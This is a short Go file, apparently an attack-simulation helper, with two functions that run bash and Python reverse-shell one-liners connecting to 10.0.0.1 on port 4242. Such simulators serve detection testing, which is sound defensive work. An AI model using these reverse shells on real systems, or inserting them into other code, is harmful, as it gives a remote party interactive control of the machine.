package simulate

import (
	"context"
	"os/exec"
	"time"
)

func BashReverseShell() error {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1")
	return cmd.Run()
}

func PythonReverseShell() error {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "python", "-c", `a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")`)
	return cmd.Run()
}
